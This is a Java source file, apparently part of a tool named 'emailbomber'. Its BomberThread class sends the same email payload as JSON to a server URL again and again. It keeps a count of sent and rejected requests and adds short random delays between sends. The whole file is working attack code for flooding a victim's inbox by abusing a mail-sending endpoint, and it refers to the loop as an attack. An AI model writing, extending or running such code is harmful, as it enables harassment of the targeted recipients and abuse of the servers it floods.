package emailbomber.bomber;

import com.fasterxml.jackson.databind.ObjectMapper;
import emailbomber.network.HttpClient;
import emailbomber.network.HttpException;
import java.io.IOException;
import java.util.concurrent.ThreadLocalRandom;

class BomberThread extends Thread {

    private String urlServidor;
    private int numPeticiones;
    private int peticionesHechas;
    private int peticionesRechazadas;
    private boolean cancelar;
    private Email emailBomb;
    private ObjectMapper mapper;

    public BomberThread(String urlServidor, Email emailBomb, int numPeticiones) {
        this.urlServidor = urlServidor;
        this.emailBomb = emailBomb;
        this.numPeticiones = numPeticiones;
        this.peticionesHechas = 0;
        this.peticionesRechazadas = 0;
        this.cancelar = false;
        this.mapper = new ObjectMapper();
    }

    public String getUrlServidor() {
        return urlServidor;
    }

    public int getNumPeticiones() {
        return numPeticiones;
    }

    public int getPeticionesHechas() {
        return peticionesHechas;
    }

    public int getPeticionesRechazadas() {
        return peticionesRechazadas;
    }
    
    public void cancelar() {
        this.cancelar = true;
    }
    
    public boolean ataqueTerminado() {
        return peticionesHechas == numPeticiones || cancelar;
        
    }

    @Override
    public void run() {
        while (!ataqueTerminado()) {
            try {
                String jsonPeticion = this.mapper.writeValueAsString(this.emailBomb);
                
                HttpClient.postRequestJson(this.urlServidor, jsonPeticion); 
                
                try {
                    sleep(ThreadLocalRandom.current().nextInt(500));
                } catch (InterruptedException ex) {
                    ex.printStackTrace();
                }
            } catch (IOException | HttpException e) {
                this.peticionesRechazadas++;
            } finally {
                this.peticionesHechas++;
            }
        }
    }

}
